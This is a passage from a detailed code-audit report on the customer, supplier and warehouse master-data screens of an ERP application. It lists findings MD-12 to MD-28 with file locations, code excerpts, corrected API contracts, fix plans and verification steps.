- **Exact Contract Specification**:
  - Request DTO — to clear a nullable field, send `null`, not `""`:
    ```json
    { "phone": null, "email": null, "birthDate": null }
    ```
  - Required DTO rule: add `@Transform(({ value }) => (typeof value === 'string' ? value.trim() || null : value))` on every optional string in `UpdateCustomerDto`, so `""` normalises to `null` before the service sees it.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/dto/customer.dto.ts` — add the `@Transform` above to `UpdateCustomerDto`; add `taxId` (currently missing) as `@IsOptional() @IsString()`.
  - `backend/src/modules/master/services/customers.service.ts:331-358` — add a `changedFields` diff and return it in the response so the UI can say "3 fields updated" and the audit log has a real before/after.
  - `frontend/src/app/(dashboard)/master/customers/_components/CustomerCreateCanvas.tsx` — strip empty strings client-side before the request, so the server never has to guess.
  - **[Verification]** Clearing a phone number then reloading shows the field empty; today it still shows the old value under a success toast.

---

### [MD-12]: `getDefaultPicId()` can return `''` and the NOT NULL `picId @db.Uuid` is then written anyway
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:295`, `:371-381`
  - Database: `backend/prisma/schema/bussdev.prisma:1-20` — `picId String @db.Uuid` (NOT NULL, no default)
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // customers.service.ts:371-381
  private async getDefaultPicId(): Promise<string> {
    try {
      const staff = await this.prisma.user.findFirst({ where: { role: 'SALES' }, orderBy: { createdAt: 'asc' } });
      return staff?.id || '';
    } catch { return ''; }
  }
  ```
  and the call site:
  ```ts
  // :295
  picId: salesAssignee || (await this.getDefaultPicId()),
  ```
  Three independent paths produce a failed insert: (a) no `User` with `role: 'SALES'` exists → `''`; (b) the `user` table is empty → `''`; (c) the `try` swallows any DB error and returns `''`. An empty string is not a valid UUID, so Postgres raises `22P02 invalid input syntax for type uuid`, Prisma surfaces it as an unrecognised error, and `MD-01` turns it into a 500. The customer is never created and the user is told the server had a problem. The `catch` at `:378-380` is exactly the silent-swallow pattern that made the `pNN_clean_db.js` gates untrustworthy.
  The same shape recurs in the import path, one layer worse: `import-export.service.ts:652` uses `picId: defaultPic?.id || randomUUID()` — a **syntactically valid but non-existent** UUID. That inserts fine and then breaks every FK that later points at the lead.
- **Exact Contract Specification**:
  - Current Response DTO when no sales staff exists — HTTP 500:
    ```json
    { "status": 500, "code": "INTERNAL_SERVER_ERROR", "message": "An unexpected internal error occurred" }
    ```
  - Required Response DTO — HTTP 422, actionable:
    ```json
    { "status": 422, "code": "MISSING_ASSIGNEE",
      "message": "No active sales user exists to own this lead. Create a user with role SALES, or pass salesAssignee.",
      "details": { "field": "picId" } }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:371-381` — return `string | null` instead of `''`; delete the `catch` (let `MD-01` classify a real DB failure). At `:295`, throw `UnprocessableEntityException` with the message above when the resolved `picId` is null.
  - `backend/src/modules/master/services/import-export.service.ts:652` — replace `randomUUID()` with the same guard; an import must not be able to mint a dangling FK.
  - **[Verification]** With the `users` table emptied, creating a customer returns 422 naming `picId`, not 500. Today it returns 500.

---

### [MD-13]: `brandCode` falls back to `CUST-${Date.now().slice(-4)}` on a `@unique` column — 10 000 customers is a guaranteed collision
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:276`
  - Database: `backend/prisma/schema/bussdev.prisma:9` — `brandCode String? @unique`
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // customers.service.ts:276
  const resolvedBrandCode = brandCode || code || `CUST-${Date.now().toString().slice(-4)}`;
  ```
  `Date.now().slice(-4)` is the last four digits of epoch milliseconds — a 10 000-value space, and it wraps every 10 seconds. Two customers created in the same 10-second window without a brand code get the same `brandCode`, the second insert violates `sales_leads_brandCode_key`, and via `MD-01` the user gets an opaque 500 instead of a retry hint. Worse, the two error paths are indistinguishable: a genuine duplicate brand code and an accidental timestamp collision both surface as "server error". A sequence-backed code is already proven in this module — `categories.service.ts:36-51` allocates via `masterKode.upsert` inside a `$transaction`.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:276` — allocate from `masterKode` in a `prisma.$transaction`, mirroring `categories.service.ts:36-51`, e.g. `CUST-000123`. Accept a client-supplied `brandCode` only as an *explicit* override and pre-check it with `findUnique` (`:282` currently writes it unverified).
  - **[Verification]** Creating 50 customers in under a second yields 50 distinct `brandCode`s; creating two customers with the same explicit brand code returns 409 naming the field.

---

### [MD-14]: Three values presented as computed money are hardcoded constants
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:128`, `:135`, `:293`
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:152-153`, `:295-302`
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // customers.service.ts:128
  sampleFeeTotal: soSampleCount * 750000,          // a literal price, not a priced line
  // :135
  escrowDeposit: Number(lead.estimatedValue || 0), // the FULL deal value presented as a deposit
  // :293 (create)
  estimatedValue: creditLimit || 0,                // a credit limit written as a deal value
  ```
  A 25 % deposit is being displayed as the entire contract value, and a customer's credit limit is being written into the lead's `estimatedValue` at creation. Neither is derived from any transaction, so both feed the KPI cards as if they were. The frontend compounds it: `sampleFeeTotal` and `nominalSoProduk` are overwritten to `0` in the mapper (`:152-153`), so the cards read 0 regardless — the hardcoded backend numbers and the frontend constants are two separate defects that happen to cancel out visually while both remain wrong in the API.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:128` — sum the actual `sampleRequest.fee` values; if no fee column exists on `SampleRequest`, return `null` rather than a fabricated number, and render "—" in the UI.
  - `backend/src/modules/master/services/customers.service.ts:135` and `:293` — stop mapping `creditLimit` onto `estimatedValue`; they are different concepts on different tables. If no deposit is recorded, return `null`.
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:152-153` — remove the ten hardcoded literals (see `MD-07`).
  - **[Verification]** A customer with 4 sample requests shows the sum of those requests' fees, not `3000000`.

---

### [MD-15]: Delete is a soft-delete that sets `status: 'LOST'`, but the UI announces permanent deletion
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:362-369`
  - Frontend: `frontend/src/app/(dashboard)/master/customers/_components/CustomerCreateCanvas.tsx` (delete `onSuccess` toast)
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // customers.service.ts:362-369
  async remove(id: string) {
    return this.prisma.salesLead.update({ where: { id }, data: { status: 'LOST' } });
  }
  ```
  No `deletedAt`, no `isActive` flag, and `LOST` is a **sales-pipeline state**. The lead remains in every funnel report and in the CRM forever, now indistinguishable from a genuinely lost deal. `findAll` does not filter on `status` by default, so the row stays visible in the grid after "deletion". The user sees a toast reading as if the record is gone, and it is not.
- **Exact Contract Specification**:
  - Required Response DTO (make the soft delete explicit and reversible):
    ```json
    { "success": true, "data": { "id": "…", "deletedAt": "2026-10-01T09:14:22.000Z",
      "restorable": true } }
    ```
  - Required contract: `DELETE /master/customers/:id` returns `204` and a subsequent `GET /master/customers/:id` returns `404` **with a `Restore` affordance in a Trash view**.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:362-369` — add `deletedAt DateTime?` to `SalesLead` via a migration, set it alongside the status change, and filter `where: { deletedAt: null }` in `findAll`/`findOne`. Add `POST /master/customers/:id/restore`.
  - Frontend — the delete confirmation must state "This hides the lead from lists; it stays in reports", and the success toast must not imply removal.
  - **[Verification]** Deleting a lead removes it from the grid and from funnel reports, and restoring it brings it back. Today it stays in the grid and reads as a lost deal.

---

### [MD-16]: `GET /master/customers/active` caps at 500 rows with no signal that the cap was hit
- **Target Files**:
  - Backend: `backend/src/modules/master/services/customers.service.ts:150-174`
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:513` (consumer)
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `take: 500` is a hard, silent truncation. The response has no `total`, no `hasMore`, no `nextCursor` — a consumer cannot tell whether it received 500 of 500 or 500 of 5 000. A dropdown, a filter, or a report fed by this endpoint silently omits every customer past the 500th, in **alphabetical order**, so the omission is biased toward whichever name range sorts last. The same pattern appears at `suppliers.service.ts:89` (`take: 200`) and `customers.service.ts:182-183` (`take: 10` on two relations, see `MD-09`).
- **Exact Contract Specification**:
  - Required Response DTO:
    ```json
    { "data": [ /* ≤500 */ ], "total": 5231, "hasMore": true, "nextCursor": "eyJpZCI6…" }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/customers.service.ts:150-174` — return `{ data, total, hasMore, nextCursor }` and keyset-paginate on `id`; keep `take: 500` as a page size, not a ceiling.
  - `backend/src/modules/master/services/suppliers.service.ts:89` — same treatment.
  - **[Verification]** With 600 suppliers, the second page returns the remainder; no consumer can silently drop rows.

---

### [MD-17]: The customers form is never reset after a successful create, so reopening it re-submits the previous customer
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:202-211`
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx` (identical pattern, `onSuccess`)
  - Frontend: `frontend/src/app/(dashboard)/master/warehouses/page.tsx:162-171`
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx` (`saveBarangMut.onSuccess`)
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The `onSuccess` handlers do four things — toast, close the modal, invalidate the query — and stop. `setCustomerForm(initialCustomerForm)` is never called. The state object survives the close. So: create "PT Contoh", close, reopen → the canvas is pre-filled with "PTContoh". The operator changes one field and submits, and the API receives a create for a *second* customer. `brandCode` is not resent (it is not in the payload, `:181-192`), so the second insert does not collide — it just silently duplicates. This defect is identical across **all four** master create forms (customers, suppliers, warehouses, goods), which suggests it was copied and never once manually re-tested.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:202-211` — add `setCustomerForm(initialCustomerForm)` to every `onSuccess`; same for the three sibling pages.
  - Better: mount the create canvas only when open, so state cannot survive a close at all — `isCustomerModalOpen && <CustomerCreateCanvas … />`. This makes the whole class of bug structurally impossible instead of four separate patches.
  - **[Verification]** Create a customer, reopen the form: every field is empty. Today the previous customer's name is still there.

---

## 📌 Module: Master Suppliers / `/master/suppliers`

### [MD-18]: The supplier grid reads seven fields that do not exist on `Supplier`, and `"-"` placeholders are written back to the database
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:129-147`
  - Backend: `backend/src/modules/master/services/suppliers.service.ts:104-156`
  - Database: `backend/prisma/schema/warehouse.prisma:131-162` (`model Supplier`)
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `Supplier` is declared at `warehouse.prisma:131-162` and has **no `code`, no `taxRate`, no `isPkp`, no `npwp`, no `bankAccount`, no `status`** — it has `tax Decimal? @default(11.00)`, `isBlacklisted Boolean @default(false)`, `termOfPayment Int @default(0)`, and a `deletedAt` soft-delete flag. The mapper reads all six non-existent keys:
  ```tsx
  // suppliers/page.tsx:129-147
  kode: s.code || "-",           // no code column
  nama: s.name || "-",
  pic: s.contact || "-",        // see below
  telepon: s.phone || "-",      // see below
  alamat: s.address || "-",
  taxRate: s.taxRate ?? 0,      // no taxRate column; the real one is `tax`
  isPkp: s.isPkp ?? false,      // no isPkp column
  npwp: s.npwp || "-",          // no npwp column
  bankAccount: s.bankAccount || "-",   // no bankAccount column
  status: s.status || "ACTIVE",        // no status column; the real one is isBlacklisted + deletedAt
  provinsi: "",                 // province is never read at all
  ```
  The `"-"` defaults are the dangerous half. `phone` and `contact` **are** real columns, so a supplier with no phone renders `"-"` and — because the edit canvas is seeded from the same mapped object — the next save sends `phone: "-"` and `contact: "-""` to the API. The literal hyphen-minus is now stored as that supplier's phone number, and every subsequent render shows a correct-looking `-`, hiding it. Verified: `s.contact` and `s.phone` are the two real columns; the other five keys are undefined on every row.
- **Exact Contract Specification**:
  - Actual Response DTO (one element of `GET /master/suppliers`):
    ```json
    [{ "id": "…", "name": "PT Pasok Utama", "contact": "Andi", "phone": "0812…",
       "email": "andi@pasok.co.id", "address": "Jl. Industri 12", "city": "Sidoarjo",
       "province": "Jawa Timur", "district": "Sukodono",
       "tax": "11.00", "isBlacklisted": false, "termOfPayment": 30,
       "picUserId": "…", "createdAt": "2026-06-02T…" }]
    ```
  - Mapper contract: consume exactly these keys. `kode`, `taxRate`, `isPkp`, `npwp`, `bankAccount`, `status` do not exist and must not be read.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx:129-147` — delete the six phantom keys; map `isBlacklisted`/`deletedAt` to a real status (`ACTIVE` | `BLACKLISTED` | `DELETED`); read `province` instead of hardcoding `""`.
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx:134-135` — change the fallbacks from `"-"` to `""` (or `null`) so a blank is never persisted. A display placeholder belongs in the renderer, not in the data layer.
  - `frontend/src/app/(dashboard)/master/suppliers/_types/supplier.types.ts` — type the response from the JSON above so the phantom keys become compile errors.
  - **[Verification]** `SELECT phone FROM suppliers` contains no `-`; a supplier with no phone shows an empty cell, and a fresh `Supplier` in Prisma Studio matches the response above field-for-field.

---

### [MD-19]: The supplier delete button is unreachable — the confirm dialog can never open
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:198`, `:248`, `:456`, `:1105-1110`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: A repo-wide grep for `setSupplierToDelete` across the file returns exactly three hits:
  ```
  198:      setSupplierToDelete(null);
  248:  const [supplierToDelete, setSupplierToDelete] = useState<MasterSupplierItem | null>(null);
  1107:        onClose={() => setSupplierToDelete(null)}
  ```
  **No code path ever passes a supplier.** The state is only ever set to `null`, so `supplierToDelete` is permanently `null`, the confirm dialog at `:1105-1110` is permanently closed, and `handleDeleteSupplier` at `:456` is dead code. The trash icon in the row either does not exist or is wired to a no-op. The practical consequence: **no user can delete a supplier from this page**, and the only removal path is the backend `DELETE /master/suppliers/:id`, which nothing in the UI calls. (The backend `remove` at `suppliers.service.ts:163-168` has its own defect — see `MD-21`.)
  Note the same file declares `isCategoryModalOpen` (`:251`) and `editingCategory` (`:252`); grep returns **one hit each, the `useState` line itself**. The supplier-category tab has no state transitions, no fetch, and no render — see `MD-20`.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx` — wire the row action to `setSupplierToDelete(supplier)` and render the dialog only when `supplierToDelete !== null`. Grep-verified: after the fix, `setSupplierToDelete` must have exactly one call site with a non-null argument.
  - Add a lint rule or a unit test that fails when a `useState` setter for a dialog flag has no call site passing a truthy value — this whole class of defect is invisible to TypeScript.
  - **[Verification]** Clicking the trash icon opens a confirm naming the supplier; confirming removes it and the row disappears. Today the button does nothing.

---

### [MD-20]: The supplier category tab is entirely dead — state declared, nothing fetched, nothing rendered
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:95`, `:251-252`, `:536`
  - Backend: `backend/src/modules/master/services/categories.service.ts:10-13`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `const [categoriesList, setCategoriesList] = useState<KategoriSupplierItem[]>([])` at `:95`. `setCategoriesList` appears **nowhere else in the file** — no `useEffect` fetches it, no query populates it, nothing renders it. Yet the tab header renders `count: categoriesList.length` (`:536`), which is permanently `0`. The identical pattern exists on the customers page (`:105`, `count: categoriesList.length` at `:536` there too). So both category tabs display a confident "0 kategori" that is not a measurement of anything, while `/master/categories` — a real, working endpoint — sits unused behind a redirect (`categories/page.tsx:13` → `/master/goods?tab=categories`).
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx:95` — add a `useQuery(["master-categories", "supplier"])` against the existing `GET /master/categories`; or, if supplier categories are a different concept, remove the tab entirely rather than showing a fake zero.
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:105` — same treatment.
  - **[Verification]** Both tabs show the real category count from the API, and the count changes when a category is created.

---

### [MD-21]: Supplier `remove` has no existence check, so deleting an already-deleted row returns 500 instead of 404
- **Target Files**:
  - Backend: `backend/src/modules/master/services/suppliers.service.ts:163-168`
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:456` (the handler that would call it)
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // suppliers.service.ts:163-168
  async remove(id: string) {
    return this.prisma.supplier.update({ where: { id }, data: { deletedAt: new Date() } });
  }
  ```
  `update` on a non-existent `id` raises `P2025`, which is unmapped (`MD-01`) and therefore surfaces as a 500. The same omission is repeated in `warehouses.service.ts:52-57` (`status: 'INACTIVE'`), `warehouses.service.ts:45-49` (update), `categories.service.ts:63-68` (update), and `categories.service.ts:70-75` (remove). This matters more than usual here because `remove` is **not idempotent in the UI sense**: the confirm dialog at `:1105-1110` is currently unreachable (`MD-19`), so the first time this is wired up, a double-click or a stale tab will produce a 500 that looks like a server fault rather than "already gone".
- **Actionable Execution Plan**:
  - Fix centrally in `MD-01` (map `P2025` → 404 `NOT_FOUND`), then make the four `remove`/`update` methods idempotent: a second delete of a soft-deleted row should return 204, not 404.
  - `backend/src/modules/master/services/suppliers.service.ts:163-168` — change the `where` to `{ id, deletedAt: null }` and treat a null result as success.
  - **[Verification]** `DELETE /master/suppliers/:id` twice returns 204 both times. Today the second returns 500.

---

### [MD-22]: `update` omits `district` and `addressDetail` entirely, and two fields are applied twice by overlapping spreads
- **Target Files**:
  - Backend: `backend/src/modules/master/services/suppliers.service.ts:104-125` (create) vs `:136-156` (update)
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `create` writes six address fields including two that `update` never mentions:
  ```ts
  // suppliers.service.ts:114-115
  district: dto.district,
  addressDetail: dto.addressDetail,
  ```
  ```ts
  // suppliers.service.ts:136-156  — update, no district, no addressDetail
  data: {
    ...(dto.name !== undefined && { name: dto.name }),
    ...
  }
  ```
  Both columns exist in `Supplier` (`warehouse.prisma:143-146`), so a supplier created with a district and a detail address can never have either corrected. The same method also spreads two pairs of keys onto the same target, second-wins:
  ```ts
  // :137-138
  ...(dto.contact !== undefined && { contact: dto.contact }),
  ...(dto.pic !== undefined && { contact: dto.pic }),      // overwrites the line above
  // :145-146
  ...(dto.tax !== undefined && { tax: dto.tax }),
  ...(dto.taxPercentage !== undefined && { tax: dto.taxPercentage }),  // and again
  ```
  `pic` and `taxPercentage` are not columns on `Supplier` — they are frontend aliases. When a client sends both (the edit canvas does, because it round-trips the mapped object), the second spread wins and the first value is dropped with no warning.
- **Exact Contract Specification**:
  - Required Request DTO for a partial update — each field appears at most once:
    ```json
    { "name": "PT Pasok Utama", "contact": "Andi", "tax": "11.00",
      "district": "Sukodono", "addressDetail": "Blok C-12" }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/dto/supplier.dto.ts` — delete `pic` and `taxPercentage` from `UpdateSupplierDto`; add `district` and `addressDetail`.
  - `backend/src/modules/master/services/suppliers.service.ts:136-156` — rewrite as a single pass over an allow-list so no key can be written twice:
    ```ts
    const FIELDS = ['name','contact','phone','email','address','city','province','district','addressDetail','tax','termOfPayment','picUserId'] as const;
    const data = Object.fromEntries(FIELDS.filter(f => dto[f] !== undefined).map(f => [f, dto[f]]));
    ```
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx:162-171` — send the real column names, and add `district`/`addressDetail` to the payload so the form is not a write-only surface.
  - **[Verification]** Editing a supplier's district persists; sending both `pic` and `contact` no longer changes the outcome silently.

---

### [MD-23]: CSV import is all-or-nothing on the server but the modal reports per-row rejection counts that are always zero
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:204-228`
  - Backend: `backend/src/modules/master/services/import-export.service.ts:428-436`, `:860`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The service aborts the entire file on the first bad row:
  ```ts
  // import-export.service.ts:428-436
  if (errors.length > 0) {
    throw new BadRequestException({ message: 'Import failed', totalRows, errors });
  }
  ```
  and on success always reports zero:
  ```ts
  // import-export.service.ts:860
  errors: [],
  ```
  The frontend reads that field as a per-row rejection count:
  ```tsx
  // suppliers/page.tsx:215
  const rejected = result?.errors?.length ?? 0;
  ```
  `errors` is only ever non-empty inside a thrown exception, and `extractApiError` discards `errors[]` (`MD-02`), so `result.errors` is `[]` on success and `undefined` on failure. **`rejected` is therefore always 0.** The user is told "0 data ditolak, 120 data berhasil" for a file where the server rejected all 120 and inserted none. A partial import is impossible: one bad email discards 119 good rows, and the UI reports success. The modal also renders an email-validation column that has no counterpart in `import-export.service.ts:600-656` — the email column is display-only.
- **Exact Contract Specification**:
  - Current (wrong) Response DTO on a 5-error file:
    ```json
    { "status": 400, "code": "HTTP_400", "message": "Import failed",
      "details": { "totalRows": 120, "errors": [ { "row": 7, "field": "email", "message": "…" } ] } }
    ```
    (the `errors` array is dropped by `extractApiError`, so the UI shows "0 ditolak")
  - Required Response DTO — partial success with per-row detail:
    ```json
    { "success": true, "data": {
        "totalRows": 120, "inserted": 115, "rejected": 5, "mode": "partial",
        "errors": [ { "row": 7, "field": "email", "message": "format tidak valid", "value": "budi@" },
                    { "row": 23, "field": "name",  "message": "wajib diisi",          "value": "" } ] } }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/import-export.service.ts:428-436` — switch to partial-commit: insert valid rows inside `$transaction`, collect rejected rows, and always return `{ totalRows, inserted, rejected, errors }` with HTTP 200. Reserve a `?strict=true` query param for callers that want all-or-nothing.
  - `frontend/src/lib/api.ts:82-110` — surface `details.errors` and `details.rejected` (see `MD-02`).
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx:204-228` — render the per-row error list with the row number and a download link to the rejected rows; remove the email-validation column, or implement the check server-side so it is not a lie.
  - **[Verification]** Importing a 10-row file with 2 bad emails inserts 8, reports `rejected: 2`, and lists both rows with their line numbers. Today it inserts 0 and reports `rejected: 0`.

---

### [MD-24]: "Export Purchase Order History" reports success without making a single API call
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:1033-1040`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The handler toasts a success message and returns. No `api.get`, no `api.post`, no Blob, no download attribute — the button produces a green toast and no file. It is indistinguishable in the UI from the working `Export` button elsewhere on the same page, so a user who clicks it and sees "berhasil diekspor" reasonably believes they have a PO history. Nothing is written and nothing is read; the audit trail of the click is the only trace.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/import-export.service.ts` — add `GET /master/suppliers/:id/export-po` returning a CSV built from `supplier.purchaseOrders`.
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx:1033-1040` — call it and trigger the download; on error, show the failure rather than success. Until the endpoint exists, remove the button — a control that lies is worse than a missing one.
  - **[Verification]** Clicking Export downloads a CSV with the supplier's PO rows. Today it downloads nothing and claims success.

---

### [MD-25]: `findAll` returns a bare array while `QuerySupplierDto` declares `page` and `limit` that are never read
- **Target Files**:
  - Backend: `backend/src/modules/master/services/suppliers.service.ts:50-58`
  - Backend: `backend/src/modules/master/dto/supplier.dto.ts:204-217`
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `QuerySupplierDto` declares `page` (`@IsInt() @Min(1) @Type(() => Number)`) and `limit` (`@Max(200)`), so `?page=2&limit=10` passes validation, is accepted by NestJS, and is then discarded — `findAll` has no `take` and no `skip`. A caller paging the API gets page 1 forever. The frontend is unaffected only because `suppliers/page.tsx:393` slices client-side over the full array. The same declaration-without-implementation pattern appears on `CustomerQueryDto` (`customer.dto.ts:20-21`, `myOnly`) and on the `scopeFilter` state at `customers/page.tsx:82` — both are accepted and both are ignored. The `@Max(200)` cap is the only sign the intent was ever server-side pagination.
- **Exact Contract Specification**:
  - Required Response DTO (aligned with `materials.service.ts:122`):
    ```json
    { "data": [ /* … */ ], "total": 87, "page": 2, "limit": 10, "totalPages": 9 }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/suppliers.service.ts:50-58` — implement the `page`/`limit` the DTO already promises, with the clamp copied from `materials.service.ts:24-26`; return the full envelope.
  - `backend/src/modules/master/services/customers.service.ts:30-69` — same, and either implement `myOnly` or delete it from the DTO (`customer.dto.ts:20-21`).
  - `frontend/src/app/(dashboard)/master/suppliers/page.tsx` — pass `page`/`limit`, key the query on them, delete the client-side slice.
  - **[Verification]** `GET /master/suppliers?page=2&limit=10` returns a different 10 rows than page 1 and reports `"total": 87`. Today it returns the same rows.

---

## 📌 Module: Master Warehouses / `/master/warehouses`

### [MD-26]: The warehouse grid reads `code` and `location`, neither of which exists, and hardcodes the province and storage type
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/warehouses/page.tsx:117-129`
  - Database: `backend/prisma/schema/warehouse.prisma:1-28` (`model Warehouse`)
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `Warehouse` has no `code` column and no `location` column — the location fields are `city`, `province`, and `address`. The mapper:
  ```tsx
  // warehouses/page.tsx:117-129
  kode: w.code || "-",                  // no code column
  lokasi: w.location || "Sidoarjo",     // no location column; every warehouse reports "Sidoarjo"
  provinsi: "Jawa Timur",               // hardcoded; w.province is never read
  tipePenyimpanan: "Suhu Ruang (Ambient)",  // no such field on the model
  totalBinLocations: 24,                // a literal, not _count
  picName: w.picName || "Ghufron Dreamlab",  // a real person's name as a fallback
  ```
  Two of these are actively dangerous. `lokasi: "Sidoarjo"` is falsified data in a logistics system — a warehouse in Surabaya is displayed as being in Sidoarjo, and the real `w.city` is right there in the response. And `picName: "Ghufron Dreamlab"` renders a named individual as the PIC of every warehouse that has no PIC assigned, so a real person's name appears to be accountable for sites they do not manage. `totalBinLocations: 24` is a constant; the model already supports a real count via the `_count.locations` relation that `warehouses.service.ts:12-20` returns and the page discards.
- **Exact Contract Specification**:
  - Actual Response DTO (one element of `GET /master/warehouses`):
    ```json
    [{ "id": "…", "name": "Gudang Sidoarjo", "city": "Sidoarjo", "province": "Jawa Timur",
       "address": "Jl. Industri 8", "phone": "0812…", "picName": "Andi",
       "isActive": true, "managerId": "…",
       "_count": { "locations": 24 } }]
    ```
  - Mapper contract: `lokasi` → `w.city`; `provinsi` → `w.province`; `totalBinLocations` → `w._count.locations`; `picName` → `w.picName ?? ""`. `kode` and `tipePenyimpanan` have no source and must not be rendered as if they did.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/warehouses/page.tsx:117-129` — apply the mapping above; delete the two fabricated columns or mark them explicitly as "not tracked" in the UI rather than filling them with constants.
  - `backend/src/modules/master/services/warehouses.service.ts:12-20` — if a warehouse `code` is genuinely required by operations, add the column with a migration and populate it server-side; do not synthesise one in the view.
  - **[Verification]** A warehouse in Surabaya shows `lokasi: "Surabaya"` and `provinsi` from the DB. Today both are constants.

---

### [MD-27]: `create` and `update` pass the DTO straight through to Prisma, so any field the DTO happens to allow is written unfiltered
- **Target Files**:
  - Backend: `backend/src/modules/master/services/warehouses.service.ts:40-42`, `:45-49`
  - Database: `backend/prisma/schema/warehouse.prisma:1-28`
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // warehouses.service.ts:40-42
  async create(dto: CreateWarehouseDto) {
    return this.prisma.warehouse.create({ data: dto });      // whole DTO, raw
  }
  // :45-49
  async update(id: string, dto: UpdateWarehouseDto) {
    return this.prisma.warehouse.update({ where: { id }, data: dto });
  }
  ```
  `whitelist: true` in the global `ValidationPipe` (`main.ts:53-56`) stops *undeclared* properties, so this is not a mass-assignment hole today. It is a latent one: the moment someone adds a field to `CreateWarehouseDto` for UI convenience — a `totalBinLocations` computed field, say — it is written to the database with no service-level allow-list, no coercion, and no unit normalisation. Every other service in the module builds an explicit field list; these two are the only ones that do not. `categories.service.ts:63-68` has the same `data: dto` shape on update.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/warehouses.service.ts:40-49` — destructure explicitly, matching `suppliers.service.ts:104-125`:
    ```ts
    const { name, city, province, address, phone, picName, isActive, managerId } = dto;
    return this.prisma.warehouse.create({ data: { name, city, province, address, phone, picName, isActive, managerId } });
    ```
  - `backend/src/modules/master/services/categories.service.ts:63-68` — same treatment.
  - Add a DTO field to a warehouse DTO and confirm it does **not** appear in the row.
  - **[Verification]** `PATCH /master/warehouses/:id` with an extra field returns 400 (`forbidNonWhitelisted`) and writes nothing unexpected.

---

### [MD-28]: `GET /master/warehouses/access` returns only the caller's own grants, but the UI presents it as the full access matrix
- **Target Files**:
  - Backend: `backend/src/modules/master/services/warehouses.service.ts` (`getUserAccess`, ~:100-118)
  - Frontend: `frontend/src/app/(dashboard)/master/warehouses/page.tsx:190-194` (the acknowledged gap)
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The page's own `ponytail:` comment concedes that the endpoint "hanya mengembalikan grant milik caller sendiri" — only the caller's own grants. A screen that renders an access list, labelled as warehouse access control, is therefore showing one person's permissions and inviting the reader to conclude that everyone else has none. This is the kind of understated gap that gets quoted in an access review. `syncUserAccess` (`:120-141`) is, by contrast, correctly written — it wraps its multi-write in `prisma.$transaction`.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/warehouses.service.ts` — add `GET /master/warehouses/access/:userId` guarded by a role check (e.g. `WAREHOUSE_ADMIN`), or label the current response `{ scope: "self", grants: [...] }` so the client can render "Your access" rather than "Access".
